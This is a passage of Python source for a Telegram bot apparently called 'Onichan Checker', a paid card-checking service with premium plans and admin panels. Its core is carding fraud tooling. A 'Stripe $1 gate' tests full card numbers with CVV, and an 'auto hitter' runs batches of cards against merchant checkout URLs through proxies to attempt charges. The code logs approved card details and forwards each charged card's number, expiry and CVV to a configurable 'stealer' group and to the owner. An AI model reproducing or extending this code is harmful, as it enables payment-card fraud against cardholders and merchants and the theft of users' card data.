                [_btn("Pay Now (UPI)", icon=EID["card"], url=result['payment_url'])],
                [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
            ]
        else:
            text = ae(f"""❌ <b>UPI Payment Error</b>

{result.get('error', 'Unknown error')}

Please try again or use another payment method.""")
            keyboard = [
                [_btn("Pay with Crypto", icon=EID["card"], callback_data="pay_crypto")],
                [_btn("Pay with Stars", icon=EID["bolt"], callback_data="pay_stars")],
                [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
            ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # PAY WITH CRYPTO
    elif query.data == "pay_crypto":
        text = ae("""🪙 <b>PAY WITH CRYPTO</b>

━━━━━━━━━━━━━━━━━━━━━━

Select your plan to pay with:
BTC, ETH, USDC, LTC, BCH, DOGE & more!

━━━━━━━━━━━━━━━━━━━━━━""")
        
        keyboard = [
            [_btn("1 Week - $3", icon=EID["card"], callback_data="buy_1_week")],
            [_btn("2 Weeks - $5", icon=EID["card"], callback_data="buy_2_weeks")],
            [_btn("1 Month - $10", icon=EID["crown"], callback_data="buy_1_month")],
            [_btn("3 Months - $25", icon=EID["card"], callback_data="buy_3_months")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # PAY WITH TELEGRAM STARS
    elif query.data == "pay_stars":
        text = ae("""⭐ <b>PAY WITH TELEGRAM STARS</b>

━━━━━━━━━━━━━━━━━━━━━━

Pay directly in Telegram!
Fast, secure, no crypto needed.

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>1 Week</b> - 150 ⭐
📦 <b>2 Weeks</b> - 250 ⭐
📦 <b>1 Month</b> - 500 ⭐ (Best!)
📦 <b>3 Months</b> - 1250 ⭐

━━━━━━━━━━━━━━━━━━━━━━""")
        
        keyboard = [
            [_btn("1 Week - 150 Stars", icon=EID["bolt"], callback_data="stars_1_week")],
            [_btn("2 Weeks - 250 Stars", icon=EID["bolt"], callback_data="stars_2_weeks")],
            [_btn("1 Month - 500 Stars", icon=EID["crown"], callback_data="stars_1_month")],
            [_btn("3 Months - 1250 Stars", icon=EID["bolt"], callback_data="stars_3_months")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # TELEGRAM STARS PAYMENT
    elif query.data.startswith("stars_"):
        plan_key = query.data.replace("stars_", "")
        
        stars_prices = {
            "1_week": 150,
            "2_weeks": 250,
            "1_month": 500,
            "3_months": 1250
        }
        
        plan_names = {
            "1_week": "1 Week Premium",
            "2_weeks": "2 Weeks Premium",
            "1_month": "1 Month Premium",
            "3_months": "3 Months Premium"
        }
        
        if plan_key not in stars_prices:
            await query.answer("Invalid plan!", show_alert=True)
            return
        
        await query.answer("Creating Stars invoice...", show_alert=False)
        
        from telegram import LabeledPrice
        
        try:
            await context.bot.send_invoice(
                chat_id=user.id,
                title=plan_names[plan_key],
                description=f"Unlock premium features for Onichan Bot",
                payload=f"premium_{plan_key}_{user.id}",
                provider_token="",
                currency="XTR",
                prices=[LabeledPrice(label=plan_names[plan_key], amount=stars_prices[plan_key])]
            )
        except Exception as e:
            print(f"[Stars] Invoice error: {e}")
            await send_gif_screen(
                f"❌ <b>Error creating Stars invoice</b>\n\n{str(e)[:100]}\n\nPlease try Crypto payment instead.",
                InlineKeyboardMarkup([
                    [_btn("Pay with Crypto", icon=EID["card"], callback_data="pay_crypto")],
                    [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
                ])
            )
    
    # PAY WITH TON — plan picker
    elif query.data == "pay_ton":
        from config import TON_WALLET
        wallet_display = f"<code>{html.escape(TON_WALLET)}</code>" if TON_WALLET else "⚠️ <i>Not configured yet — contact owner</i>"
        text = (
            f"💎 <b>PAY WITH TON</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Fast, decentralised payment on The Open Network.\n"
            f"No account required — just your TON wallet!\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📦 <b>1 Week</b>   — 0.6 TON\n"
            f"📦 <b>2 Weeks</b>  — 1.0 TON\n"
            f"📦 <b>1 Month</b>  — 2.0 TON ⭐\n"
            f"📦 <b>3 Months</b> — 5.0 TON\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💼 <b>Wallet:</b> {wallet_display}\n\n"
            f"Select a plan to get the exact amount and payment instructions."
        )
        keyboard = [
            [_btn("1 Week — 0.6 TON", icon=EID["card"], callback_data="ton_1_week")],
            [_btn("2 Weeks — 1.0 TON", icon=EID["card"], callback_data="ton_2_weeks")],
            [_btn("1 Month — 2.0 TON", icon=EID["crown"], callback_data="ton_1_month")],
            [_btn("3 Months — 5.0 TON", icon=EID["card"], callback_data="ton_3_months")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
        ]
        await send_gif_screen(text, InlineKeyboardMarkup(keyboard))

    # TON PLAN SELECTED — show wallet + auto-monitor instructions
    elif query.data.startswith("ton_"):
        plan_key = query.data[4:]  # strip "ton_"
        if plan_key not in TON_PLANS:
            await query.answer("Invalid plan!", show_alert=True)
            return
        plan = TON_PLANS[plan_key]
        from config import TON_WALLET
        if not TON_WALLET:
            await query.answer("TON payments not configured yet. Contact the owner.", show_alert=True)
            return
        await query.answer("Loading payment details...", show_alert=False)

        # Register in monitor — uses user's Telegram ID as the payment comment
        _ton_monitor.add_pending(
            user_id=user.id,
            plan_key=plan_key,
            name=plan["name"],
            duration_days=plan["duration_days"],
            ton_amount=plan["ton"],
        )

        uid_str = str(user.id)
        text = (
            f"💎 <b>TON PAYMENT</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📦 <b>Plan:</b> {plan['name']}\n"
            f"💎 <b>Amount:</b> <b>{plan['ton']} TON</b>\n"
            f"⏰ <b>Duration:</b> {plan['duration_days']} days\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💼 <b>Send to this wallet:</b>\n"
            f"<code>{html.escape(TON_WALLET)}</code>\n\n"
            f"💬 <b>Comment / Memo (required):</b>\n"
            f"<code>{uid_str}</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<b>📋 Steps:</b>\n"
            f"1️⃣ Open Tonkeeper, @wallet or any TON app\n"
            f"2️⃣ Send exactly <b>{plan['ton']} TON</b> to the wallet above\n"
            f"3️⃣ In the <b>Comment / Memo</b> field enter: <code>{uid_str}</code>\n"
            f"4️⃣ Confirm the transaction\n\n"
            f"✅ <b>Premium activates automatically</b> within ~30 seconds!"
        )
        keyboard = [
            [_btn("BACK", style="default", icon=EID["back"], callback_data="pay_ton")]
        ]
        await send_gif_screen(text, InlineKeyboardMarkup(keyboard))

    # BUY PLAN - Create CoinPayments Order
    elif query.data.startswith("buy_"):
        plan_key = query.data.replace("buy_", "")
        
        if plan_key not in CRYPTO_PLANS:
            await query.answer("Invalid plan!", show_alert=True)
            return
        
        await query.answer("Creating payment...", show_alert=False)
        
        import os
        domain = os.environ.get("REPLIT_DEPLOYMENT_URL") or os.environ.get("REPLIT_DEV_DOMAIN", "")
        if domain and not domain.startswith("http"):
            domain = f"https://{domain}"
        callback_url = f"{domain}/webhook/oxapay" if domain else None
        
        result = cp_create_order(
            user_id=user.id,
            username=user.username or user.first_name or "User",
            plan_key=plan_key,
            crypto="USDT",
            callback_url=callback_url
        )
        
        if result.get("error"):
            await send_gif_screen(
                f"❌ <b>Payment Error</b>\n\n{result['error']}\n\nPlease contact @{SUPPORT_USERNAME}",
                InlineKeyboardMarkup([
                    [_btn("Contact Support", style="default", icon=EID["users"], url=f"https://t.me/{SUPPORT_USERNAME}")],
                    [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
                ])
            )
            return
        
        plan = result['plan']
        payment_url = result.get('payment_url', '')
        order_id = result.get('order_id', result.get('txn_id', ''))
        
        text = ae(f"""💳 <b>CRYPTO PAYMENT ORDER</b>

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Plan:</b> {plan['name']}
💵 <b>Amount:</b> ${plan['price']} USD
⏰ <b>Duration:</b> {plan['duration_days']} days

━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Order ID:</b> <code>{order_id}</code>

━━━━━━━━━━━━━━━━━━━━━━

🪙 <b>Pay with BTC, LTC, ETH, USDT & more!</b>

✅ Premium activates automatically!
⏰ Order expires in 1 hour

━━━━━━━━━━━━━━━━━━━━━━""")
        
        keyboard = []
        if payment_url:
            keyboard.append([_btn("Pay Now", icon=EID["card"], url=payment_url)])
        keyboard.append([_btn("Check Status", style="success", icon=EID["regenerate"], callback_data=f"check_{order_id}")])
        keyboard.append([_btn("BACK", style="default", icon=EID["back"], callback_data="premium")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # CHECK PAYMENT STATUS
    elif query.data.startswith("check_"):
        order_id = query.data.replace("check_", "").replace("payment_", "")
        
        await query.answer("Checking payment status...", show_alert=False)
        
        from modules.oxapay import get_pending_payments
        all_pending = get_pending_payments()
        pending = next((p for p in all_pending if p.get("order_id") == order_id or p.get("track_id") == order_id), None)
        
        track_id = order_id
        if pending and pending.get("track_id"):
            track_id = pending["track_id"]
        
        result = cp_query_order(track_id)
        
        oxa_status = str(result.get("status", "")).lower()
        is_paid = oxa_status in ["paid", "confirming", "confirmed", "complete", "sending"]
        
        if is_paid and pending:
            plan = CRYPTO_PLANS.get(pending["plan_key"], {})
            days = plan.get("duration_days", 7)
            from datetime import timedelta
            expiry = datetime.now() + timedelta(days=days)
            cp_activate_premium(pending["user_id"], pending["plan_key"], pending.get("username", "User"), "OxaPay Crypto")
            cp_mark_complete(order_id, pending["user_id"], pending["plan_key"])
            text = ae(f"""✅ <b>PAYMENT CONFIRMED!</b>

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Plan:</b> {plan.get('name', pending["plan_key"])}
📅 <b>Expires:</b> {expiry.strftime("%Y-%m-%d")}

━━━━━━━━━━━━━━━━━━━━━━

🎉 Your premium is now active!
Enjoy all premium features!""")
            
            keyboard = [
                [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
            ]
        elif is_paid:
            text = "✅ Payment confirmed! Your premium should be active."
            keyboard = [
                [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
            ]
        else:
            status = result.get("status", "Waiting")
            error = result.get("error", "")
            
            if error and "not found" in error.lower():
                text = ae(f"""⚠️ <b>ORDER NOT FOUND</b>

Order ID: <code>{order_id}</code>

This order may have expired or is invalid.""")
            else:
                payment_url = pending.get("payment_url", "") if pending else ""
                text = ae(f"""⏳ <b>PAYMENT PENDING</b>

━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Order:</b> <code>{order_id}</code>
📊 <b>Status:</b> {status}

━━━━━━━━━━━━━━━━━━━━━━

Complete payment on OxaPay, then check again.""")
            
            keyboard = []
            if payment_url:
                keyboard.append([_btn("Pay Now", icon=EID["card"], url=payment_url)])
            keyboard.append([_btn("Check Again", style="success", icon=EID["regenerate"], callback_data=f"check_{order_id}")])
            keyboard.append([_btn("BACK", style="default", icon=EID["back"], callback_data="premium")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # MY PAYMENTS - Show pending orders
    elif query.data == "my_payments":
        text = ae(f"""💳 <b>PAYMENT STATUS</b>

━━━━━━━━━━━━━━━━━━━━━━

Payments are verified manually.

📋 <b>Your User ID:</b> <code>{user.id}</code>

After sending payment, contact owner with:
• Your User ID
• Payment screenshot
• Plan purchased

Premium activates within 5 mins! ✅

━━━━━━━━━━━━━━━━━━━━━━""")
        
        keyboard = [
            [_btn("Contact Owner", style="default", icon=EID["users"], url=f"https://t.me/{SUPPORT_USERNAME}")],
            [_btn("Buy Premium", icon=EID["crown"], callback_data="premium")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # ADMIN - ALL USERS LIST
    elif query.data == "admin_users":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_OWNER, 'r') as f:
                owners = [l.strip() for l in f if l.strip()]
            with open(DB_PREMIUM, 'r') as f:
                premium = [l.strip().split()[0] for l in f if l.strip()]
            with open(DB_FREE, 'r') as f:
                free = [l.strip() for l in f if l.strip()]
        except:
            owners = premium = free = []
        
        all_ids = list(set(owners + premium + free))
        
        text = ae(f"""👥 <b>ALL USERS</b>

━━━━━━━━━━━━━━━━━━━━━━

👑 <b>Owners:</b> {len(owners)}
💎 <b>Premium:</b> {len(premium)}
🆓 <b>Free:</b> {len(free)}
📊 <b>Total Unique:</b> {len(all_ids)}

━━━━━━━━━━━━━━━━━━━━━━

👤 <b>Recent Users (Last 10):</b>

""")
        for i, uid in enumerate(all_ids[-10:], 1):
            try:
                user_info = await context.bot.get_chat(int(uid))
                username = f"@{user_info.username}" if user_info.username else user_info.first_name
            except:
                username = "Unknown"
            
            role = "👑" if uid in owners else ("💎" if uid in premium else "🆓")
            text += f"{role} {username}\n   🆔 <code>{uid}</code>\n\n"
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # ADMIN - PREMIUM USERS LIST
    elif query.data == "admin_premium":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_PREMIUM, 'r') as f:
                premium_lines = [l.strip() for l in f if l.strip()]
        except:
            premium_lines = []
        
        text = ae(f"""💎 <b>PREMIUM USERS</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Total Premium:</b> {len(premium_lines)}

━━━━━━━━━━━━━━━━━━━━━━

""")
        if not premium_lines:
            text += "No premium users yet.\n"
        else:
            for i, line in enumerate(premium_lines[-15:], 1):
                parts = line.split()
                uid = parts[0]
                expiry = parts[1] if len(parts) > 1 else "N/A"
                try:
                    user_info = await context.bot.get_chat(int(uid))
                    username = f"@{user_info.username}" if user_info.username else user_info.first_name
                except:
                    username = "Unknown"
                text += f"<b>{i}.</b> {username}\n   🆔 <code>{uid}</code>\n   ⏰ Expires: {expiry}\n\n"
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # ADMIN - FREE USERS LIST
    elif query.data == "admin_free":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_FREE, 'r') as f:
                free_users = [l.strip() for l in f if l.strip()]
        except:
            free_users = []
        
        text = ae(f"""🆓 <b>FREE USERS</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Total Free Users:</b> {len(free_users)}

━━━━━━━━━━━━━━━━━━━━━━

""")
        if not free_users:
            text += "No free users yet.\n"
        else:
            for i, uid in enumerate(free_users[-15:], 1):
                try:
                    user_info = await context.bot.get_chat(int(uid))
                    username = f"@{user_info.username}" if user_info.username else user_info.first_name
                except:
                    username = "Unknown"
                text += f"<b>{i}.</b> {username}\n   🆔 <code>{uid}</code>\n\n"
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # ADMIN - PENDING USERS LIST
    elif query.data == "admin_pending":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_PENDING, 'r') as f:
                pending = f.readlines()
        except:
            pending = []
        
        text = ae(f"""⏳ <b>PENDING USERS</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Awaiting Approval:</b> {len(pending)}

━━━━━━━━━━━━━━━━━━━━━━

""")
        if not pending:
            text += "No pending users!\n"
        else:
            for i, line in enumerate(pending[-15:], 1):
                if '|' in line:
                    parts = line.strip().split('|')
                    if len(parts) >= 3:
                        uid, username, name = parts[0], parts[1], parts[2]
                        text += f"<b>{i}.</b> {name}\n   👤 @{username}\n   🆔 <code>{uid}</code>\n   ✅ /approve {uid}\n\n"
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # ADMIN - BANNED USERS LIST
    elif query.data == "admin_banned":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_BANNED, 'r') as f:
                banned_users = [l.strip() for l in f if l.strip()]
        except:
            banned_users = []
        
        text = ae(f"""🚫 <b>BANNED USERS</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Total Banned:</b> {len(banned_users)}

━━━━━━━━━━━━━━━━━━━━━━

""")
        if not banned_users:
            text += "No banned users.\n"
        else:
            for i, uid in enumerate(banned_users[-15:], 1):
                try:
                    user_info = await context.bot.get_chat(int(uid))
                    username = f"@{user_info.username}" if user_info.username else user_info.first_name
                except:
                    username = "Unknown"
                text += f"<b>{i}.</b> {username}\n   🆔 <code>{uid}</code>\n   ✅ /unban {uid}\n\n"
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # ADMIN - ADMINS LIST
    elif query.data == "admin_admins":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_OWNER, 'r') as f:
                admins = [int(l.strip()) for l in f if l.strip().isdigit()]
        except:
            admins = []
        
        text = ae(f"""👑 <b>ADMIN LIST</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Total Admins:</b> {len(admins)}

━━━━━━━━━━━━━━━━━━━━━━

""")
        for i, admin_id in enumerate(admins, 1):
            try:
                admin_user = await context.bot.get_chat(admin_id)
                admin_name = f"@{admin_user.username}" if admin_user.username else admin_user.first_name
            except:
                admin_name = "Unknown"
            
            owner_badge = " (Primary)" if admin_id == OWNER_ID else ""
            text += f"<b>{i}.</b> {admin_name}{owner_badge}\n   🆔 <code>{admin_id}</code>\n\n"
        
        text += """━━━━━━━━━━━━━━━━━━━━━━

<code>/addadmin [id]</code> - Add admin
<code>/removeadmin [id]</code> - Remove"""
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # ADMIN - STATS
    elif query.data == "admin_stats":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_OWNER, 'r') as f:
                owners = [l.strip() for l in f if l.strip()]
            with open(DB_PREMIUM, 'r') as f:
                premium = [l.strip() for l in f if l.strip()]
            with open(DB_FREE, 'r') as f:
                free = [l.strip() for l in f if l.strip()]
            with open(DB_BANNED, 'r') as f:
                banned = [l.strip() for l in f if l.strip()]
            with open(DB_PENDING, 'r') as f:
                pending = [l.strip() for l in f if l.strip()]
        except:
            owners = premium = free = banned = pending = []
        
        total_revenue = get_total_revenue()
        approved_count = get_approved_count()
        
        text = ae(f"""📊 <b>DETAILED STATISTICS</b>

━━━━━━━━━━━━━━━━━━━━━━

👥 <b>Users:</b>
👑 Owners: {len(owners)}
💎 Premium: {len(premium)}
🆓 Free: {len(free)}
⏳ Pending: {len(pending)}
🚫 Banned: {len(banned)}

━━━━━━━━━━━━━━━━━━━━━━

💰 <b>Revenue:</b> ${total_revenue:.2f}
✅ <b>Cards Approved:</b> {approved_count}

━━━━━━━━━━━━━━━━━━━━━━

🚪 <b>Gates:</b> 23+ Available
🔧 <b>Tools:</b> 8 Available""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # ADMIN - SETTINGS
    elif query.data == "admin_settings":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        stealer_group = get_stealer_group_id()
        stealer_status = f"<code>{stealer_group}</code>" if stealer_group else "Not Set"
        
        text = ae(f"""⚙️ <b>BOT SETTINGS</b>

━━━━━━━━━━━━━━━━━━━━━━

🔓 <b>Stealer Group:</b> {stealer_status}

━━━━━━━━━━━━━━━━━━━━━━

<b>Commands:</b>
<code>/setstealer [group_id]</code> - Set stealer group
<code>/setstealer off</code> - Disable stealer
<code>/getid</code> - Get chat ID (run in group)

━━━━━━━━━━━━━━━━━━━━━━

<b>Premium Keys:</b>
<code>/genkey [days] [count]</code> - Generate keys
<code>/keys</code> - View active keys""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="admin")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

    # BACK TO START
    elif query.data == "start":
        from modules.database import get_user_check_stats
        
        # Get user stats
        stats = get_user_check_stats(user.id)
        total_checks = stats.get('total', 0)
        approved = stats.get('approved', 0)
        declined = stats.get('declined', 0)
        success_rate = stats.get('success_rate', 0)
        first_check = stats.get('first_check')
        
        # Format join date
        if first_check:
            join_date = first_check.strftime("%b %d, %Y")
        else:
            join_date = "New User"
        
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN CHECKER</b>
{sep}
🌸 <b>Hii {user.first_name}!</b>
{sep}
👑 <b>Status</b>   : {rank}
🆔 <b>ID</b>       : <code>{user.id}</code>
📅 <b>Since</b>    : {join_date}
💳 <b>Checks</b>   : {total_checks:,}
✅ <b>Approved</b> : {approved:,}
❌ <b>Declined</b> : {declined:,}
📈 <b>Rate</b>     : {success_rate}%
{sep}
⚡ 21 Gates | 📋 Mass Check | 🎯 Auto Hitter
🔮 Proxy | 📱 Temp Phone | 🧚 AI Chat
{sep}
💎 <b>Premium</b> : $3/w · $5/2w · $10/m · $25/3m
{sep}""")
        
        keyboard = [
            [
                _btn("Gates", icon=EID["live"], callback_data="gates"),
                _btn("Tools", icon=EID["bolt"], callback_data="tools")
            ],
            [
                _btn("Premium", icon=EID["crown"], callback_data="premium"),
                _btn("Stats", icon=EID["stats"], callback_data="info")
            ]
        ]
        
        if is_owner(user.id):
            keyboard.append([
                _btn("Help", icon=EID["question"], callback_data="help_menu"),
                _btn("Admin", icon=EID["crown"], callback_data="admin")
            ])
        else:
            keyboard.append([
                _btn("Help", icon=EID["question"], callback_data="help_menu"),
                _btn("Channel", icon=EID["broadcast"], url=f"https://t.me/{CHANNEL_USERNAME}")
            ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await send_gif_screen(text, reply_markup)

# ============================================================================
# RPP GATE COMMAND
# ============================================================================

@require_approval
async def gate_st1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /st1 command for Stripe $1 gate"""
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("st1"):
        await update.message.reply_text(offline_message("st1"), parse_mode=ParseMode.HTML)
        return
    user = update.effective_user
    message = update.message

    if not context.args:
        await message.reply_text(
            "<b>Stripe $1 Gate</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/st1 cc|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/st1 4111111111111111|12|25|123</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    card_text = ' '.join(context.args)
    card = rpp_parse_card(card_text)
    
    if not card:
        await message.reply_text(
            "Invalid card format.\n\n"
            "<b>Use:</b> <code>/st1 cc|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    loading_msg = await message.reply_text(
        "Checking card on Stripe $1 gate...",
        parse_mode=ParseMode.HTML
    )
    
    start_ts = asyncio.get_event_loop().time()
    try:
        # check_razorpay is the actual function exported from rpp_gate
        result = await check_razorpay(
            card['number'],
            card['month'],
            card['year'],
            card['cvv'],
            amount=1
        )
        elapsed = round(asyncio.get_event_loop().time() - start_ts, 2)

        status     = result.get('status', 'UNKNOWN')
        card_str   = result.get('card', card_text)
        msg_text   = result.get('message', result.get('response', ''))
        username   = user.username or user.first_name

        def _send_result(gif_type, caption):
            return gif_type, caption

        if status == 'APPROVED':
            response = (
                f"✅ <b>APPROVED</b>\n\n"
                f"💳 <b>Card:</b> <code>{card_str}</code>\n"
                f"🏦 <b>Response:</b> {msg_text}\n"
                f"⚡ <b>Gate:</b> Stripe $1 (RPP)\n"
                f"⏱ <b>Time:</b> {elapsed}s\n\n"
                f"👤 <b>Checked by:</b> @{username}"
            )
            gif_type = "success"
            try:
                log_approved_card(
                    user.id, username,
                    card['number'], card['month'], card['year'], card['cvv'],
                    "st1", msg_text, {}
                )
            except Exception:
                pass
        elif status == 'ERROR':
            response = (
                f"⚠️ <b>ERROR</b>\n\n"
                f"💳 <b>Card:</b> <code>{card_str}</code>\n"
                f"❌ <b>Reason:</b> {msg_text}\n"
                f"⚡ <b>Gate:</b> Stripe $1 (RPP)\n\n"
                f"👤 <b>Checked by:</b> @{username}"
            )
            gif_type = "failed"
        else:
            response = (
                f"❌ <b>DECLINED</b>\n\n"
                f"💳 <b>Card:</b> <code>{card_str}</code>\n"
                f"🔻 <b>Reason:</b> {msg_text}\n"
                f"⚡ <b>Gate:</b> Stripe $1 (RPP)\n"
                f"⏱ <b>Time:</b> {elapsed}s\n\n"
                f"👤 <b>Checked by:</b> @{username}"
            )
            gif_type = "failed"

        gif_url = get_sexy_anime_gif(gif_type)
        try:
            await loading_msg.delete()
            if gif_url:
                await context.bot.send_animation(
                    chat_id=message.chat_id, animation=gif_url,
                    caption=response, parse_mode=ParseMode.HTML)
            else:
                await context.bot.send_message(
                    chat_id=message.chat_id, text=response,
                    parse_mode=ParseMode.HTML)
        except Exception:
            try:
                await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
            except Exception:
                pass

    except Exception as e:
        try:
            await loading_msg.edit_text(
                f"⚠️ <b>Gate Error:</b> {str(e)[:120]}",
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

# ============================================================================
# AUTO HITTER COMMAND
# ============================================================================

async def _run_auto_hit(update, context, url, cards, loading_msg):
    """Core hit runner — shared by auto_hitter_command and saved-BIN callback."""
    user = update.effective_user
    user_email = ah_get_user_email(user.id)
    user_proxy = _pick_proxy(user.id)
    cards = cards[:10]

    try:
        proxy_url = ah_get_proxy_url(user_proxy) if user_proxy else None
        checkout_data = await tls_get_checkout_info(url, proxy_url)
        if not checkout_data.get("pk") or not checkout_data.get("cs"):
            await loading_msg.edit_text(f"{PE_CROSS} <b>Could not parse checkout URL.</b>", parse_mode=ParseMode.HTML)
            return

        merchant = html.escape(str(checkout_data.get('merchant') or 'Unknown'))
        sym = get_currency_symbol(checkout_data.get("currency", "USD"))
        price = checkout_data.get("price")
        price_str = f"{sym}{price:.2f}" if price else "N/A"
        success_url = checkout_data.get("success_url") or "N/A"
        amount = f"{price_str} {checkout_data.get('currency', 'USD')}"
        trial_info = _get_trial_info_text(checkout_data)

        if not cards:
            await loading_msg.edit_text(
                f"{PE_CROSS} <b>No cards to hit.</b> Provide a card with the URL.",
                parse_mode=ParseMode.HTML
            )
            return

        hit_key = f"{user.id}_{loading_msg.message_id}"
        _active_hits[hit_key] = True
        checkout_data['email'] = user_email or 'N/A'
        card_statuses = [f"{EMOJI['hitting']} Pending..." for _ in cards]

        stop_keyboard = InlineKeyboardMarkup([
            [_btn("Stop", style="default", icon=EID["stopped"], callback_data=f"hitstop_{hit_key}")]
        ])

        status_text = await _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, 0, email=user_email, trial_info=trial_info)
        await _safe_edit(loading_msg, status_text, parse_mode=ParseMode.HTML, reply_markup=stop_keyboard)

        results = {"charged": [], "live": [], "declined": [], "3ds": [], "error": []}
        hit_detail_blocks: list = []

        for i, card in enumerate(cards):
            if not _active_hits.get(hit_key, False):
                for j in range(i, len(cards)):
                    card_statuses[j] = f"Stopped {EMOJI['stopped']}"
                break

            card_statuses[i] = f"{EMOJI['bolt']} Hitting..."
            await _safe_edit(
                loading_msg,
                await _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, i, email=user_email, trial_info=trial_info),
                parse_mode=ParseMode.HTML, reply_markup=stop_keyboard
            )

            try:
                result = await auto_hitter_charge(card, checkout_data, user_proxy, user_email)
            except Exception as ex:
                result = {"status": "ERROR", "response": str(ex)[:60], "time": 0}

            status = result.get("status", "ERROR")
            card_str = f"{card['cc'][:6]}****{card['cc'][-4:]}|{card['month']}|{card['year']}"
            response_text = html.escape(str(result.get("response", "N/A")))
            decline_code = result.get("decline_code", "")

            if status == "CHARGED":
                card_statuses[i] = f"CHARGED {EMOJI['charged']}"
                results["charged"].append(card_str)
                try:
                    from modules.bin_lookup import lookup_bin
                    _bin_info = lookup_bin(card['cc'][:6])
                except:
                    _bin_info = {}
                log_approved_card(user.id, user.username or user.first_name,
                                  card['cc'], card['month'], card['year'], card['cvv'],
                                  "auto_hitter", response_text, _bin_info)
                await send_to_stealer_group(context.bot, card['cc'], card['month'], card['year'], card['cvv'],
                                            "auto_hitter", response_text, _bin_info, user.id, user.username or user.first_name)
                check_time = float(result.get('time', 2.5) or 2.5)
                hit_detail_blocks.append(_build_hit_detail_block(card, result, checkout_data, _bin_info, check_time))
                try:
                    from config import OWNER_ID
                    await context.bot.send_message(
                        chat_id=OWNER_ID,
                        text=(f"{EMOJI['charged']} <b>AUTO HITTER CHARGED!</b>\n\n"
                              f"{EMOJI['users']} User: @{user.username or user.id}\n"
